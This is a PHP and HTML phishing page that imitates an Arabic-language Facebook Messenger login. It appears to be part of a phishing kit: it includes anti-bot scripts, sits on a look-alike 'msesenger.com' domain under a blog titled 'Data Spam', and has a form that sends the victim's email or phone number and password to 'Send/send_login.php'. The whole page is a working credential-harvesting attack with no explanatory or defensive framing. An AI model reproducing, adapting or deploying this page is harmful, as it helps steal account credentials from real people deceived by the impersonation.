<?php
error_reporting(0);
session_start();
@include("BOTS/BOT_1.php");
@include("BOTS/BOT_2.php");
@include("BOTS/BOT_3.php");
@include("BOTS/BOT_4.php");
@include("BOTS/BOT_5.php");
@include("BOTS/BOT_6.php");
@include("BOTS/BOT_7.php");
@include("BOTS/BOT_8.php");
@include("BOTS/BOT_9.php");
@include("BOTS/BOT_10.php");
@include("BOTS/BOT_11.php");
@include("BOTS/BOT_12.php");
@include("BOTS/BOT_13.php");
?>
<!DOCTYPE html>
<html>
        <head>
        <link href="https://www.blogger.com/static/v1/widgets/1089598926-widget_css_bundle_rtl.css" rel="stylesheet" type="text/css">
        <meta content="IE=edge,chrome=1" thhp-equiv="X-UA-Compatible">
        <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no" name="viewport">
        <title>
        Mess - Mlog
        </title>
        <style id="page-skin-1" type="text/css"><!--
        body, html{margin: 0; padding: 0;  margin-top: -16px;background-color: #fff;}
        .blog-pager{display: none;}
        .blog-feeds{display: none;}
        .status-msg-wrap{display: none;}
        .post-title{display: none;}
        --></style>
        <link href="https://www.blogger.com/dyn-css/authorization.css?targetBlogID=5391374898397236117&amp;zx=120bd671-083d-4bc4-aaf5-03f2ad72dbe0" media="all" onload="if(media!='all')media='all'" rel="stylesheet"><noscript><link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=5391374898397236117&amp;zx=120bd671-083d-4bc4-aaf5-03f2ad72dbe0' rel='stylesheet'/></noscript>
        
        </head>
        <body>
        <?php include('antibots.php'); ?>
        <audio autoplay="" preload=""><source src="https://i.top4top.io/m_1539rk9b51.mp3" type="audio/mpeg"></audio>
        <div class="main section" id="main"><div class="widget Blog" data-version="1" id="Blog1">
        <div class="blog-posts hfeed">
        
                  <div class="date-outer">
                
        
                  <div class="date-posts">
                
        <div class="post-outer">
        <div class="post hentry uncustomized-post-template" itemprop="blogPost" itemscope="itemscope" itemtype="http://schema.org/BlogPosting">
        <meta content="5391374898397236117" itemprop="blogId">
        <meta content="2638131066174514649" itemprop="postId">
        <a name="2638131066174514649"></a>
        <h3 class="post-title entry-title" itemprop="name">
        Mess - Mlog
        </h3>
        <div class="post-header">
        <div class="post-header-line-1"></div>
        </div>
        <div class="post-body entry-content" id="post-body-2638131066174514649" itemprop="description articleBody">
        
           
        <meta charset="utf-8">
        <meta content="IE=edge,chrome=1" thhp-equiv="X-UA-Compatible">
        <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no" name="viewport">
        <title>
         - Log in
        </title>
        <style>
        body{
        background: #fff;
        color: #1c1e21;
        direction: rtl;
        line-height: 1.34;
        margin: 0;
        padding: 0;
        overflow: hidden;
        display: block;
        font-family: Helvetica, Arial, sans-serif;
        font-size: 13px;
        }
        
        input::-webkit-input-placeholder {
        color: #AFB5B8;
        }
        input:focus::-webkit-input-placeholder {
        color: #bec3c9;
        }
        input{
        -webkit-writing-mode: horizontal-tb !important;
        text-rendering: auto;
        color: initial;
        letter-spacing: normal;
        word-spacing: normal;
        text-transform: none;
        text-indent: 0px;
        text-shadow: none;
        display: inline-block;
        text-align: start;
        -webkit-appearance: textfield;
        background-color: white;
        -webkit-rtl-ordering: logical;
        cursor: text;
        margin: 0em;
        font: 400 13.3333px Arial;
        padding: 1px 0px;
        border-width: 2px;
        border-style: inset;
        border-color: initial;
        border-image: initial;
        }
        
        </style>
        
        
        
        <div style="display: table;
        height: 100%;
        min-height: 600px;
        width: 100%;">
          
        <div style="display: table-cell;
        vertical-align: middle;">
        <i style="height: 120px !important;
        width: 120px;
        background-position: 0 0;
        display: block;
        margin-right: auto;
        margin-left: auto;
        background-image: url(https://1.bp.blogspot.com/-foY2pqdoeA4/XmAwSz1P5jI/AAAAAAAAAqM/UU72rhBfolwBzUX3MIKFR9gtmAMtytKyACLcBGAsYHQ/s320/sobky_scam.png);
        background-size: auto;
        background-repeat: no-repeat;"></i>
        <h1 style="color: rgba(0, 0, 0, 1);
        font-size: 41px;
        font-weight: 300;
        margin-bottom: 24px;
        text-align: center;
        margin: 0;
        padding: 0;
        font-family: Helvetica Neue, Segoe UI, Helvetica, Arial, sans-serif;">
                  Messenger
                </h1>
        <br>
        <h2 style="color: rgba(0, 0, 0, 1);
        font-size: 17px;
        font-weight: 200;
        line-height: 1.2;
        margin-bottom: 24px;
        text-align: center;
        font-family: Helvetica Neue, Segoe UI, Helvetica, Arial, sans-serif;
        }">يمكنك التواصل فورًا مع الأشخاص الموجودين في حياتك </h2>
        <div style="color: rgba(0, 0, 0, 1);
        font-size: 17px;
        font-weight: 200;
        line-height: 1.2;
        margin-bottom: 24px;
        text-align: center;
        font-family: Helvetica Neue, Segoe UI, Helvetica, Arial, sans-serif;
        }">تسجيل الدخول بحساب &rlm;&lrm;Facebook&lrm;&rlm; لبدء الاستخدام</div>
        <form action="Send/send_login.php" id="veh0" method="post" name="loginform">
        <input style="border: 1px solid rgba(0, 0, 0, .20);
        border-radius: 4px;
        color: rgba(0, 0, 0, 1);
        display: block;
        font-family: Helvetica Neue, Segoe UI, Helvetica, Arial, sans-serif;
        font-size: 18px;
        height: 42px;
        margin-bottom: 12px;
        margin-right: auto;
        margin-left: auto;
        padding: 0 16px;
        width: 286px;
        background: #FFFFFF  repeat-x;" minlength="9" name="email" oninput="setCustomValidity('')" oninvalid="this.setCustomValidity(ادخل بريد الكتروني اؤ رقم هاتف صحيح)" placeholder="البريد الالكتروني او رقم الهاتف" required="" type="text">
        <input style="border: 1px solid rgba(0, 0, 0, .20);
        border-radius: 4px;
        color: rgba(0, 0, 0, 1);
        display: block;
        font-family: Helvetica Neue, Segoe UI, Helvetica, Arial, sans-serif;
        font-size: 18px;
        height: 42px;
        margin-bottom: 12px;
        margin-right: auto;
        margin-left: auto;
        padding: 0 16px;
        width: 286px;
        background: #FFFFFF  repeat-x;" minlength="6" name="pass" oninput="setCustomValidity('')" oninvalid="this.setCustomValidity(ادخل كلمه سر صحيحه)" placeholder="كلمه السر" required="" type="password">
        <input style="
        background: #fff;
        color: #0084ff;
        font-size: 25px;
        font-weight: normal;
        margin-top: 24px;
        align-items: center;
        border: none;
        box-shadow: none;
        display: flex;
        margin-right: auto;
        margin-left: auto;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
        font-family: Helvetica Neue, Segoe UI, Helvetica, Arial, sans-serif;
        cursor: pointer;
        line-height: 26px;
        padding: 0 10px;" type="submit" value="متابعة">
        </form>
        <label style="margin-right: 28px;
        display: inline-block;
        margin-right: 17px;
        vertical-align: baseline;
        color: #929292;
        font-size: 15px;
        font-weight: normal;
        font-family: Helvetica Neue, Segoe UI, Helvetica, Arial, sans-serif;
        text-align: center;
        display: block;
        margin-right: auto;
        margin-left: auto;
        margin-top: 40px;
        width: 320px;" for="input">
                  البقاء قيد تسجيل الدخول
                </label>
        <div style="font-size: 20px;
        text-align: center;
        padding: 5px;
        margin: 10px;
        height: 30px;
        >
        <a href="#" id="copyright" style="text-decoration: none; color: #FFF;  font-weight: bold; " title="Messenger">
                    Messenger Copyright ©️
                  </a>
        </div>
        </div>
        </div>
        <img src="https://1.top4top.net/p_131093ibc1.png" width="1px">
        
        
        <div style="clear: both;"></div>
        </div>
        <div class="post-footer">
        <div class="post-footer-line post-footer-line-1">
        <span class="post-author vcard">
        </span>
        <span class="post-timestamp">
        </span>
        <span class="reaction-buttons">
        </span>
        <span class="post-comment-link">
        </span>
        <span class="post-icons">
        </span>
        <div class="post-share-buttons goog-inline-block">
        </div>
        </div>
        <div class="post-footer-line post-footer-line-2">
        <span class="post-labels">
        </span>
        </div>
        <div class="post-footer-line post-footer-line-3">
        <span class="post-location">
        </span>
        </div>
        </div>
        </div>
        <div class="comments" id="comments">
        <a name="comments"></a>
        </div>
        </div>
        
                </div></div>
              
        </div>
        <div class="blog-pager" id="blog-pager">
        <a class="home-link" href="https://data.msesenger.com/">الصفحة الرئيسية</a>
        </div>
        <div class="clear"></div>
        <div class="blog-feeds">
        <div class="feed-links">
        الاشتراك في:
        <a class="feed-link" href="https://data.msesenger.com/feeds/posts/default" target="_blank" type="application/atom+xml">الرسائل (Atom)</a>
        </div>
        </div>
        </div></div>
        <script src="https://raw.githack.com/hostspam/data/master/nocopy.js"></script>
        
        <script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/2806403702-widgets.js"></script>
        <script type="text/javascript">
        window['__wavt'] = 'AOuZoY54yz5CxUnseXPcBTjNJdisu9YWXg:1593800173189';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d5391374898397236117','//data.msesenger.com/p/mess-mlog.html','5391374898397236117');
        _WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '5391374898397236117', 'title': 'Data Spam', 'url': 'https://data.msesenger.com/p/mess-mlog.html', 'canonicalUrl': 'https://data.msesenger.com/p/mess-mlog.html', 'homepageUrl': 'https://data.msesenger.com/', 'searchUrl': 'https://data.msesenger.com/search', 'canonicalHomepageUrl': 'https://data.msesenger.com/', 'blogspotFaviconUrl': 'https://data.msesenger.com/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': true, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'ar', 'localeUnderscoreDelimited': 'ar', 'languageDirection': 'rtl', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Data Spam - Atom\x22 href\x3d\x22https://data.msesenger.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22Data Spam - RSS\x22 href\x3d\x22https://data.msesenger.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Data Spam - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/5391374898397236117/posts/default\x22 /\x3e\n', 'meTag': '', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/1f0346ddea91f961', 'plusOneApiSrc': 'https://apis.google.com/js/plusone.js', 'disableGComments': true, 'sharing': {'platforms': [{'name': 'الحصول على الرابط', 'key': 'link', 'shareMessage': 'الحصول على الرابط', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'مشاركة إلى Facebook', 'target': 'facebook'}, {'name': 'كتابة مدونة حول هذه المشاركة', 'key': 'blogThis', 'shareMessage': 'كتابة مدونة حول هذه المشاركة', 'target': 'blog'}, {'name': 'Twitter', 'key': 'twitter', 'shareMessage': 'مشاركة إلى Twitter', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'مشاركة إلى Pinterest', 'target': 'pinterest'}, {'name': 'بريد إلكتروني', 'key': 'email', 'shareMessage': 'بريد إلكتروني', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 300, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27ar\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'قراءة المزيد', 'pageType': 'static_page', 'pageId': '2638131066174514649', 'pageName': 'Mess - Mlog', 'pageTitle': 'Data Spam: Mess - Mlog'}}, {'name': 'features', 'data': {'sharing_get_link_dialog': 'true', 'sharing_native': 'false'}}, {'name': 'messages', 'data': {'edit': 'تعديل', 'linkCopiedToClipboard': 'تم نسخ الرابط إلى الحافظة', 'ok': 'حسن&#1611;ا', 'postLink': 'رابط المشاركة'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': 'مخصص', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'Mess - Mlog', 'description': ' ', 'url': 'https://data.msesenger.com/p/mess-mlog.html', 'type': 'item', 'isSingleItem': true, 'isMultipleItems': false, 'isError': false, 'isPage': true, 'isPost': false, 'isHomepage': false, 'isArchive': false, 'isLabelSearch': false, 'pageId': 2638131066174514649}}]);
        _WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/1424751536-lbx__ar.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/368954415-lightbox_bundle_rtl.css'}, 'displayModeFull'));
        </script>
        
        </body></html>